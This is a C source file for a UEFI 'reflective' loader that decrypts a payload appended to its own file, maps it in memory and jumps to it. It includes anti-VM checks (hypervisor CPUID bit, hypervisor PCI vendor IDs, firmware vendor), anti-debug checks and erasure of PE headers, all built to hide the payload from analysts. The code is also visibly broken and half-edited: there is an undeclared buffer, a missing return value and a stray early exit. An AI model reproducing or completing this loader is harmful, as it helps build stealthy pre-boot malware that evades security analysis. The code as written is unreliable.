/*=====================================*/
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 17
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 03.08.2026
//     PROJECT  : REFLECTIVE-EFI-LOADER
//     PLATFORM : UEFI
/*=====================================*/




/* GitHub: https://github.com/vk-candpython/efildr


REQUIREMENTS (
    Сompiler : GCC (GNU-EFI)
    Support  : UEFI (PE32+)
)


https://github.com/vk-candpython/efildr/blob/main/loader.h

INTERNAL LOADER DECLARATIONS */
#include "loader.h"
#include "payload.h"



/* Compile-time validation of feature flags */

#define _FLAG_IS_BOOLEAN(flg) _Static_assert(              \
    ((flg) == 0) || ((flg) == 1),                          \
    "Build flag: '" #flg "', must be either (0) or (1)"    \
)


_FLAG_IS_BOOLEAN(  USING_ANTI_VM           );
_FLAG_IS_BOOLEAN(  USING_ANTI_DEBUG        );
_FLAG_IS_BOOLEAN(  USING_ERASE_PE_HEADERS  );


#undef _FLAG_IS_BOOLEAN




/* Terminate current process with error string,
   Uses only in LOADER-ENTRY-POINT
   (_ErrorExitString & _exit) */
#define LDR_EXIT(ErrStr16) do {              \
    _ErrorExitString = (CHAR16*)ErrStr16;    \
    goto _exit;                              \
} while (0)




/* Finds a case-insensitive ASCII substring in a CHAR16 string */
DEC_FUNC(BOOLEAN) FindSubString(const RESTR_PTR(CHAR16) String,
                                const RESTR_PTR(CHAR16) SubString) {
    IF_UNLIKE (!(String && SubString)) return FALSE;

    const CHAR16 first = ASCII_TOLOWER(*SubString);
    /* Empty substring always matches */
    IF_UNLIKE (!first) return TRUE;


    WHILE_LIKE (*String++) {
        /* Skip until the first character matches */
        IF_LIKE (ASCII_TOLOWER(String[-1]) != first)
            continue;

        const CHAR16 *s = String;
        const CHAR16 *p = SubString + 1;

        /* Compare the remaining characters */
        WHILE_LIKE (TRUE) {
            const CHAR16 a = *s;
            const CHAR16 b = *p;

            IF_UNLIKE (!(a && b) || (ASCII_TOLOWER(a) != ASCII_TOLOWER(b)))
                break;

            ++s, ++p;
        }

        /* Full substring matched */
        IF_LIKE (!*p) return TRUE;
    }

    return FALSE;
}




/* Copy PE image data into allocated memory */
DEC_FUNC(VOID) CopyImageData(
    RESTR_PTR(VOID) const         img,
    RESTR_PTR(VOID) const         buf,
    CONST_PTR(IMAGE_NT_HEADERS64) hdNt
) {
    /* Copy PE headers */
    MEMCPY(img, buf, hdNt->OptionalHeader.SizeOfHeaders);


    const IMAGE_SECTION_HEADER *sn =
        IMAGE_FIRST_SECTION(hdNt);

    CONST_PTR(IMAGE_SECTION_HEADER) se =
        sn + hdNt->FileHeader.NumberOfSections;

    /* Copy each section */
    FOR_LIKE (,  sn < se,  sn++) {
        const UINT32 vrSz = sn->Misc.VirtualSize,
                     rwSz = sn->SizeOfRawData;

        /* Skip virtual-only sections
           with no data */
        IF_UNLIKE (!vrSz) continue;


        VOID *const     dst = RVA(VOID*, img, sn->VirtualAddress  );
        CONST_PTR(VOID) src = RVA(VOID*, buf, sn->PointerToRawData);
        const UINT32    sz  = MIN(vrSz, rwSz);


        /* Copy section data to image */
        IF_LIKE (sz) MEMCPY(dst, src, sz);

        /* Zero out the rest of the section */
        IF_UNLIKE (vrSz > rwSz) ZEROS((UINT8*)dst + rwSz, vrSz - rwSz);
    }
}




/* Apply base relocations to the mapped image */
DEC_FUNC(VOID) ApplyImageRelocations(
    VOID *const                        img,
    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt
) {
    /* Relocation delta actual
       load address offset from ImageBase */
    const UINT64 dlt = (UINT64)img - hdOpt->ImageBase;


    CONST_PTR(IMAGE_DATA_DIRECTORY) ldr =
        &hdOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    /* Skip if no base relocation table is present */
    IF_UNLIKE (!ldr->VirtualAddress) return;


    const IMAGE_BASE_RELOCATION *rl =
        RVA(IMAGE_BASE_RELOCATION*, img, ldr->VirtualAddress);

    CONST_PTR(IMAGE_BASE_RELOCATION) rlEnd =
        RVA(IMAGE_BASE_RELOCATION*, rl, ldr->Size);


    /* Process each relocation block */
    WHILE_LIKE (rl < rlEnd) {
        UINT8 *const      blkVA = RVA(UINT8*, img, rl->VirtualAddress);
        const UINT16     *it    = (UINT16*)(rl + 1);
        CONST_PTR(UINT16) itEnd = it + RELOC_ENTRY_COUNT(rl);


        /* Apply all fixups in this block */
        FOR_LIKE (,  it < itEnd,  it++) {
            const UINT16 entry = *it;

            IF_LIKE (RELOC_IS_DIR64(entry)) {
                const UINT32 ofs = RELOC_BLOCK_OFFSET(entry);
                *(UINT64*)(blkVA + ofs) += dlt;
            }
        }


        /* Advance to next relocation block */
        rl = RVA(IMAGE_BASE_RELOCATION*, rl, rl->SizeOfBlock);
    }
}




/* Stateful byte mixing (keyed XOR + rotation + state update) */
#define DEC_BYTE(b, idx, stt, key, msk) ({            \
    const UINT32 _j   =  (*(idx))++;                  \
    const UINT8  _s   =  *(stt);                      \
    const UINT8  _k1  =  (key)[ _j       & (msk)];    \
    const UINT8  _k2  =  (key)[(_j >> 3) & (msk)];    \
    const UINT8  _k3  =  (key)[(_j >> 6) & (msk)];    \
                                                      \
    UINT8 _r;                                         \
    _r  =  (b) ^ _s ^ _k1;                            \
    _r  =  ((_r << 6) | (_r >> 2)) + _k2;             \
    _r  =  _r ^ (_s >> 3) ^ _k3;                      \
    _r  =  ((_r << 4) | (_r >> 4)) - (_s << 1);       \
    _r  =  ~_r ^ ((_k1 + (_k2 & ~_s)) ^ ~_k3);        \
                                                      \
    *(stt)  =  (_r << 1) | (_r >> 7);                 \
                                                      \
    /* Return decrypt byte */                         \
    _r;                                               \
})


/* Decode encrypted RLE-compressed data */
DEC_FUNC(VOID) UnPackData(
    RESTR_PTR(UINT8)             dst, const UINT32 dstSz,
    RESTR_PTR(const UINT8)       src, const UINT32 srcSz,
    RESTR_PTR(const UINT8) const key, const UINT8  msk
) {
    UINT32 idx = 0;
    UINT8  stt = *key;

    CONST_PTR(UINT8) dstEnd = dst + dstSz;
    CONST_PTR(UINT8) srcEnd = src + srcSz;


    WHILE_LIKE ((dst < dstEnd) && (src < srcEnd)) {
        const UINT8 c = DEC_BYTE(*src++, &idx, &stt, key, msk);

        IF_UNLIKE (c & RLE_FLG_RUN) {
            IF_UNLIKE (src >= srcEnd) return;

            const UINT8 v = DEC_BYTE(*src++, &idx, &stt, key, msk);
            UINT8       l = c & RLE_MAX_RUN;

            WHILE_LIKE (l--) *dst++ = v;
        }
        else {
            IF_UNLIKE (c > (srcEnd - src)) return;

            UINT8 l = c;

            WHILE_LIKE (l--) *dst++ = DEC_BYTE(*src++, &idx, &stt, key, msk);
        }
    }
}




/* Extracts the appended payload overlay
   from the current process image file */
DEC_FUNC(const UINT8*) ReadOverLay(
    CONST_PTR(EFI_LOADED_IMAGE_PROTOCOL) LoadedImage
) {
    /* Initialize with size marker length
       for the initial read */
    UINT32 tlLn  = DAT_LEN_SZ;
    UINT8 *dtBuf = NULL;

    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FsProt   = NULL;
    EFI_FILE_PROTOCOL               *Volume   = NULL;
    EFI_FILE_PROTOCOL               *File     = NULL;
    EFI_FILE_INFO                   *FileInfo = NULL;
    UINTN                            InfoSize = 0;
    UINT64                           FileSize = 0;


    IF_EFIFAILCHAINCALL (
        IN(BS->HandleProtocol,
            LoadedImage->DeviceHandle,
            &FileSystemProtocol, (VOID**)&FsProt
        ),

        IN(FsProt->OpenVolume, FsProt, &Volume)
    ) goto _ret;


    IF_EFIFAILCHAINCALL (
        IN(Volume->Open, Volume, &File,
            ((FILEPATH_DEVICE_PATH*)LoadedImage->FilePath)->PathName,
            EFI_FILE_MODE_READ, 0
        ),

        IN(File->GetInfo, File,
            &GenericFileInfo, &InfoSize, NULL),

        IN(BS->AllocatePool, EfiLoaderData,
            InfoSize, (VOID**)&FileInfo),

        IN(File->GetInfo, File,
            &GenericFileInfo, &InfoSize, FileInfo)
    ) goto _ret;


    FileSize = FileInfo->FileSize;
    IF_UNLIKE ((sizeof(tlLn) + (UINT64)tlLn) > FileSize) goto _ret;


    UINTN BufLen = (UINTN)tlLn;

    IF_EFIFAILCHAINCALL (
        IN(File->SetPosition, File, FileSize - (UINT64)tlLn),
        IN(File->Read, File, &BufLen, &tlLn)
    ) goto _ret;


    tlLn += DAT_LEN_SZ;

    IF_EFIFAILCALL (BS->AllocatePool, EfiLoaderData, tlLn, (VOID**)&dtBuf)
        goto _ret;



Print(L"FILE: %d\r\n", InfoSize);
_ret:
    IF_LIKE (FileInfo) EFI_CALL(BS->FreePool,  FileInfo);
    IF_LIKE (File)     EFI_CALL(File->Close,   File    );
    IF_LIKE (Volume)   EFI_CALL(Volume->Close, Volume  );

    return;
}




/* Anti-VM Engine:
   Returns TRUE if virtual machine is DETECTED */
#if (USING_ANTI_VM)
DEC_FUNC(BOOLEAN) AntiVM(CONST_PTR(VOID) ImageHandle) {
    BOOLEAN is_VM = TRUE;
    EFI_HANDLE *hBuffer = NULL;

{//* FIRMWARE-VENDOR
    CONST_PTR(CHAR16) FirmwareVendor = ST->FirmwareVendor;

    CONST_PTR(CHAR16) ven[] = IBV_FIRMWARE_VENDORS;
    const UINT8 venSz = sizeof(ven) / sizeof(*ven);


    BOOLEAN FoundIBV = FALSE;

    FOR_LIKE (UINT8 i = 0,  !FoundIBV && (i < venSz),  i++)
        FoundIBV = FindSubString(FirmwareVendor, ven[i]);

    /* Firmware vendor not matched */
    IF_UNLIKE (!FoundIBV) goto _ret;
}//* FIRMWARE-VENDOR

{//* CPUID
    BOOLEAN hypervisor;

    DEC_ASM (
        "movl $1, %%eax\n\t" // 1. Set CPUID function 1 (Processor Info)
        "cpuid\n\t"          // 2. Execute CPUID (fills EAX, EBX, ECX, EDX)
        "btl $31, %%ecx\n\t" // 3. Bit test bit 31 (Hypervisor Present Bit)

        : "=@ccc"(hypervisor)
        : : "rax", "rbx", "rcx", "rdx"
    );

    IF_UNLIKE (hypervisor) goto _ret;
}//* CPUID

{//* PCIVEN
    EFI_GUID PciIoGuid = EFI_PCI_IO_PROTOCOL_GUID;
    UINTN    hCount    = 0;

    /* Assume VM if PCI I/O handles are not enumerable */
    IF_EFIFAIL (LibLocateHandle(
        ByProtocol, &PciIoGuid,
        NULL, &hCount, &hBuffer
    )) goto _ret;


    UINT16 vendorID;

    FOR_LIKE (UINTN i = 0,  i < hCount,  i++) {
        EFI_PCI_IO_PROTOCOL *pciIo = NULL;

        IF_EFIFAILCHAINCALL (
            /* Open the PCI I/O protocol for each device handle */
            IN(BS->OpenProtocol,
                hBuffer[i], &PciIoGuid, (VOID**)&pciIo,
                ImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL
            ),

            /* Read Vendor ID (offset 0) from PCI config space */
            IN(pciIo->Pci.Read, pciIo, EfiPciIoWidthUint16,
               0, 1, &vendorID)
        ) continue;


        /* Match known VM vendor IDs */
        switch (vendorID) {
            case PCI_VENID_VBOX      :
            case PCI_VENID_VMWARE    :

            case PCI_VENID_QEMU      :
            case PCI_VENID_QEMU_BRG  :
            case PCI_VENID_QEMU_VGA  :

            case PCI_VENID_XEN       :
            case PCI_VENID_HYPER_V   :
            case PCI_VENID_PARALLELS :
            /* VM vendor is detected */
                goto _ret;
        }
    }
}//* PCIVEN

/* VM is not detected */
is_VM = FALSE;

_ret:
    IF_LIKE (hBuffer) EFI_CALL(BS->FreePool, hBuffer);
    return is_VM;
}
#endif




/* Anti-Debug Engine:
   Returns TRUE if debug/anomaly is DETECTED */
#if (USING_ANTI_DEBUG)
DEC_FUNC(BOOLEAN) AntiDebug(VOID) {
    BOOLEAN is_DEBUG = TRUE;
    UINT64  flg;


    DEC_ASM ("pushfq ; popq %0\n\t" : "=r"(flg));
    /* Trap Flag (TF) is set */
    IF_UNLIKE (flg & CPU_RFLAGS_TF) goto _ret;

    DEC_ASM ("movq %%dr7, %0\n\t" : "=r"(flg));
    /* Any hardware breakpoint is enabled */
    IF_UNLIKE (flg & CPU_DR7_BP_MASK) goto _ret;


/* DEBUGGER is not detected */
is_DEBUG = FALSE;

_ret:
    return is_DEBUG;
}
#endif


#if (USING_ANTI_DEBUG)
    #define _ANTITRAP() do {               \
        IF_UNLIKE (AntiDebug())            \
            LDR_EXIT(LDR_ERR_ANALYSIS);    \
    } while (0)
#else
    #define _ANTITRAP() ((VOID)USING_ANTI_DEBUG)
#endif




/*
/==================\
 LOADER-ENTRY-POINT
/==================\
*/
EFI_STATUS EFIAPI efi_main(
    EFI_HANDLE        ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
) { CHAR16           *_ErrorExitString = NULL;

_ANTITRAP();
    VOID  *img;
    UINT64 AddrOfEntryPoint;

    InitializeLib(ImageHandle, SystemTable);
_ANTITRAP();


#if (USING_ANTI_VM)
    IF_UNLIKE (AntiVM(ImageHandle))
        LDR_EXIT(LDR_ERR_ANALYSIS);
_ANTITRAP();
#endif


{//* MAIN
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;

    IF_EFIFAILCALL (BS->HandleProtocol,
        ImageHandle, &gEfiLoadedImageProtocolGuid,
        (VOID**)&LoadedImage
    ) LDR_EXIT(LDR_ERR_LOADED_IMAGE);
_ANTITRAP();

ReadOverLay(LoadedImage);
LDR_EXIT(LDR_ERR_LOADED_IMAGE);

    CONST_PTR(IMAGE_NT_HEADERS64) hdNt =
        RVA(IMAGE_NT_HEADERS64*, buf, DOS_LFANEW(buf));

    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt =
        &hdNt->OptionalHeader;


    /* Verify image is an EFI application */
    IF_UNLIKE (hdOpt->Subsystem != IMAGE_SUBSYSTEM_EFI_APPLICATION)
        LDR_EXIT(LDR_ERR_SUBSYSTEM);


{//* ALLOCATE IMAGE
_ANTITRAP();
    EFI_PHYSICAL_ADDRESS imgAddr = 0;
    UINTN imgPages = (UINTN)EFI_SIZE_TO_PAGES(hdOpt->SizeOfImage);

    IF_EFIFAILCALL (BS->AllocatePages,
        AllocateAnyPages, EfiLoaderCode,
        imgPages, &imgAddr
    ) LDR_EXIT(LDR_ERR_ALLOC_IMAGE);

    img = (VOID*)imgAddr;
_ANTITRAP();
}//* ALLOCATE IMAGE


    CopyImageData(img, buf, hdNt);
_ANTITRAP();
    ApplyImageRelocations(img, hdOpt);


    AddrOfEntryPoint = RVA(UINT64, img, hdOpt->AddressOfEntryPoint);

    LoadedImage->ImageBase = img;
    LoadedImage->ImageSize = (UINT64)hdOpt->SizeOfImage;
}//* MAIN


#if (USING_ERASE_PE_HEADERS)
{//* ERASE PE HEADERS
_ANTITRAP();
    IMAGE_NT_HEADERS64 *_nt =
        RVA(IMAGE_NT_HEADERS64*, img, DOS_LFANEW(img));

    ZEROS(img, _nt->OptionalHeader.SizeOfHeaders);
}//* ERASE PE HEADERS
#endif



    /* Transfer control to the loaded executable */
_ANTITRAP(); DEC_ASM (
        "movq %0, %%rax\n\t"   // Move entry point address
        "movq %1, %%rcx\n\t"   // ImageHandle (1st argument)
        "movq %2, %%rdx\n\t"   // SystemTable (2nd argument)

        "andq $-16, %%rsp\n\t" // Align stack to 16-byte boundary
        "subq $40,  %%rsp\n\t" // Reserve 32-byte shadow space + 8 for alignment

        "jmpq *%%rax\n\t"      // Jump to the loaded image entry point

        : : "r"(AddrOfEntryPoint), "r"(ImageHandle), "r"(SystemTable)
        : "memory", "cc", "rax", "rcx", "rdx"
    );



_exit:
    /* Set error text color */
    EFI_CALL(SystemTable->ConOut->SetAttribute,
        SystemTable->ConOut, EFI_BACKGROUND_BLACK|EFI_LIGHTRED);


    /* Display error message */
    IF_LIKE (_ErrorExitString) Print(
        LDR_ERR_FORMAT, LDR_ERR_PREFIX, _ErrorExitString
    );


    /* Stop execution permanently */
    DEC_ASM ("cli"); WHILE_LIKE (TRUE) DEC_ASM ("hlt");
    return EFI_LOAD_ERROR;
}
